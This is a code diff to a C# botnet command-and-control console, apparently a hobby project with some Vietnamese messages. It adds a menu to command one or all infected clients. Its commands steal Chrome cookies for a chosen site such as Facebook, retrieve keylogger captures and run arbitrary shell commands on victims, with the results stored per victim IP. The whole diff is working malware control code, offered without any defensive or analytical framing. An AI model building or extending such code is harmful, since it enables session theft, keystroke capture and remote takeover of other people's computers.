@@ -67,13 +67,185 @@ namespace Control
             {
                 if(clients.Count > 0 && isFinished == true)
                 {
-                    Console.WriteLine(" Command & Control Center");
-                    Console.Write("Enter your command: ");
-                    string command = Console.ReadLine();
-                    handleCommand(command);
+                    Console.WriteLine("Command & Control Center");
+                    Console.WriteLine("Select mode:");
+                    Console.WriteLine("1.Control one client.");
+                    Console.WriteLine("2.Control all clients.");
+                    Console.WriteLine("3.List clients connected.");
+                    Console.WriteLine("4.List command.");
+                    Console.WriteLine("5.Clear console.");
+                    Console.Write("Enter mode: ");
+                    string input = Console.ReadLine();
+                    if (int.TryParse(input, out int mode))
+                    {
+                       if(mode == 1)
+                        {
+                            int i = 1;
+                            string[] listIp = new string[10000];
+                            foreach (var ip in clients.Values)
+                            {
+                                listIp[i - 1] = ip;
+                                Console.WriteLine(i +". " + ip);
+                                i++;
+                            }
+                            Console.Write("Select ip (index):");
+                            
+                            string indexChoose = Console.ReadLine();
+
+                            if (int.TryParse(indexChoose, out int index))
+                            {
+                                if (index <= 0 || index >= i)
+                                {
+                                    Console.WriteLine("Invalid index.");
+                                }
+                                else
+                                {
+                                    Console.WriteLine("Ip selected:" + listIp[index - 1]);
+                                    Console.Write("Enter your command: ");
+                                    string command = Console.ReadLine();
+                                    handleCommandOneClient(command, listIp[index - 1]);
+                                }
+                            }
+                            else
+                            {
+                                Console.WriteLine("Index invalid");
+                            }   
+
+                             
+                           
+                            
+                        }    
+                       else if(mode == 2)
+                        {
+                            Console.Write("Enter your command: ");
+                            string command = Console.ReadLine();
+                            handleCommandAllClients(command);
+                        }
+                        else if (mode == 3)
+                        {
+                            Console.WriteLine(clients.Count + " client connected.");
+                            int i = 1;
+                            foreach (var ip in clients.Values)
+                            {
+                                Console.WriteLine(i + ". " + ip);
+                                i++;
+                            }
+                        }
+                        else if (mode == 4)
+                        {
+                            Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
+                            Console.WriteLine("get keylogger                       --> Get File From Bot");
+                            Console.WriteLine("run cmd command                     --> Get Result Command From Bot");
+                            Console.WriteLine("read keylogger                      --> Read Keylogger File From Bot (only work for mode 2)");
+                            Console.WriteLine("read cookies                        --> Read Cookies File From Bot (only work for mode 2)");
+                            Console.WriteLine("read cmd command                    --> Read CMD Command File From Bot (only work for mode 2)");
+                            Console.WriteLine("clear                               --> Clear The Screen");
+                            Console.WriteLine("exit                                --> Exit Socket");
+                        }
+                        else if (mode == 5)
+                        {
+                            Console.Clear();
+                        }
+                        else
+                        {
+                            Console.WriteLine("Invalid mode. Please enter a valid mode (1 - 5).");
+                        }    
+                    }
+                    else
+                    {
+                        Console.WriteLine("Invalid input. Please enter a valid integer.");
+                    }
+
                 }
                 
             }
+        }
+        public static async void handleCommandOneClient(string command,string ip)
+        {
+            TcpClient clientSelected = new TcpClient() ;
+            foreach (var pair in clients)
+            {
+                if (pair.Value == ip)
+                {
+                    clientSelected = pair.Key;
+                    break;
+                }
+            }
+
+            if (command == "exit")
+            {
+                //socket.Send(encoding.GetBytes("exit"));
+
+                //sendMessageSocket("exit", socket);
+                //Console.WriteLine("Sending exit command...");
+
+                // receive message
+                //byte[] data = new byte[BUFFER_SIZE];
+                //socket.Receive(data);
+                //Console.WriteLine("Client: " + encoding.GetString(data));
+
+
+                //string messageReceive = receiveMessageSocket(socket);
+                //Console.WriteLine("Client: " + messageReceive);
+
+            }
+            else if (command == "get cookies")
+            {
+                Console.WriteLine("Enter url you want to get cookie, please write full url (example : https://www.facebook.com):");
+                string url = Console.ReadLine();
+                string ms = "cookies?" + url + "?";
+                sendMessageSocket(ms, clientSelected.Client);
+                Console.WriteLine("Sending request get cookies...");
+                receiveFileSocket(clientSelected, "cookies");
+                Console.WriteLine("Receive cookies complete!");
+
+            }
+            else if (command == "get keylogger")
+            {
+                sendMessageSocket("keylogger", clientSelected.Client);
+                Console.WriteLine("Sending request get keylogger...");
+                receiveFileSocket(clientSelected, "keylogger");
+                Console.WriteLine("Receive keylogger complete!");
+            }
+            else if (command == "run cmd command")
+            {
+                string cmd = "";
+                Console.Write("Enter command:");
+                cmd = Console.ReadLine();
+                string ms = "run cmd command " + cmd;
+                sendMessageSocket(ms, clientSelected.Client);
+                Console.WriteLine("Sending request run cmd command...");
+                receiveFileSocket(clientSelected, "cmd");
+                Console.WriteLine("Receive rs command complete!");
+
+
+            }
+            else if (command == "read keylogger")
+            {
+                string type = "keylogger";
+                string rs = readFile(type, ip.Split(':')[0]);
+                Console.Write(rs);
+
+            }
+            else if (command == "read cookies")
+            {
+                string type = "cookies";
+                string rs = readFile(type, ip.Split(':')[0]);
+                Console.Write(rs);
+
+            }
+            else if (command == "read cmd command")
+            {
+                string type = "cmd";
+                string rs = readFile(type, ip.Split(':')[0]);
+                Console.Write(rs);
+
+            }
+            else  
+            {
+                Console.WriteLine("Command invalid");
+            }
+
         }
 
         public static void receiveFileSocket(TcpClient client,string type)
@@ -122,15 +294,12 @@ namespace Control
                 fs.Write(data, 0, dataLength);
                 fs.Close();
          }    
-        public static async void handleCommand(string command)
+        public static async void handleCommandAllClients(string command)
         {
             //Socket socket = client.Client;
             command = command.Trim().ToLower();
-            if(command == "clear")
-            {
-                Console.Clear();
-            } 
-            else if(command == "exit")
+           
+            if(command == "exit")
             {
 
                 //sendMessageSocket("exit", socket);
@@ -169,41 +338,6 @@ namespace Control
             }
             else if (command == "get keylogger")
             {
-
-
-                //foreach (var cli in clients.Keys)
-                //{
-                //    //Thread th_cli = new Thread(() => {
-
-                //    //    clients.TryGetValue(cli, out string ip);
-                //    //    sendMessageSocket("keylogger", cli.Client);
-                //    //    Console.WriteLine("Sending request get keylogger to "+ ip+"...");
-                //    //    receiveFileSocket(cli, "keylogger");
-                //    //    Console.WriteLine("Receive keylogger from "+ip+"!");
-                //    //});
-                //    //th_cli.Start();
-
-                //    //<-------------------->
-                //    Task task = Task.Run(async () =>
-                //    {
-                //        try
-                //        {
-                //            clients.TryGetValue(cli, out string ip);
-                //            sendMessageSocket("keylogger", cli.Client);
-                //            Console.WriteLine("Sending request get keylogger to " + ip + "...");
-                //            receiveFileSocket(cli, "keylogger");
-                //            Console.WriteLine("Receive keylogger from " + ip + "!");
-                //        }
-                //        catch (Exception ex)
-                //        {
-                //            Console.WriteLine("Lỗi khi xử lý luồng: " + ex.Message);
-                //        }
-                //    });
-
-                //    tasks.Add(task);
-                //}
-                //await Task.WhenAll(tasks);
-                //Console.WriteLine("Xong hết tất cả tasks" );
 
                 List<Task> keyloggerTasks = new List<Task>();
 
@@ -263,50 +397,38 @@ namespace Control
                 await Task.WhenAll(cmdTasks);
                 isFinished = true;
                 Console.WriteLine("Nhan thanh cong cac file cmd tu botnet.");
-
-
-                //sendMessageSocket(ms,socket);
-                //Console.WriteLine("Sending request run cmd command...");
-                //receiveFileSocket(client, "cmd");
-                //Console.WriteLine("Receive rs command complete!");
             }
-            else if (command == "read keylogger")
-            {
-                string type = "keylogger";
-                string rs = readFile(type);
-                Console.Write(rs);
+            //else if (command == "read keylogger")
+            //{
+            //    string type = "keylogger";
+            //    string rs = readFile(type);
+            //    Console.Write(rs);
 
-            }
-            else if (command == "read cookies")
-            {
-                string type = "cookies";
-                string rs = readFile(type);
-                Console.Write(rs);
+            //}
+            //else if (command == "read cookies")
+            //{
+            //    string type = "cookies";
+            //    string rs = readFile(type);
+            //    Console.Write(rs);
 
-            }
-            else if (command == "read cmd command")
-            {
-                string type = "cmd";
-                string rs = readFile(type);
-                Console.Write(rs);
+            //}
+            //else if (command == "read cmd command")
+            //{
+            //    string type = "cmd";
+            //    string rs = readFile(type);
+            //    Console.Write(rs);
 
-            }
-            else if(command == "help")
+            //}
+
+            else
             {
-                Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
-                Console.WriteLine("get keylogger                       --> Get File From Bot");
-                Console.WriteLine("run cmd command                     --> Get Result Command From Bot");
-                Console.WriteLine("read keylogger                      --> Read Keylogger File From Bot");
-                Console.WriteLine("read cookies                        --> Read Cookies File From Bot");
-                Console.WriteLine("read cmd command                    --> Read CMD Command File From Bot");
-                Console.WriteLine("clear                               --> Clear The Screen");
-                Console.WriteLine("exit                                --> Exit Socket");
+                Console.WriteLine("Command invalid.");
             }
                
         }
-      
-            
-        
+       
+
+
         public static void sendMessageSocket(string message,Socket socket)
         {
             socket.Send(encoding.GetBytes(message));
@@ -320,20 +442,20 @@ namespace Control
         }
 
 
-        public static string readFile(string type)
+        public static string readFile(string type,string ip)
         {
             string fileName = "";
             if (type == "cookies")
             {
-                fileName = "cookies.txt";
+                fileName = ip+"_cookies.txt";
             }
             else if (type == "keylogger")
             {
-                fileName = "keylogger.txt";
+                fileName = ip+"_keylogger.txt";
             }
             else if (type == "cmd")
             {
-                fileName = "cmdResult.txt";
+                fileName =ip+ "_cmdResult.txt";
             }
 
             string rs = "";
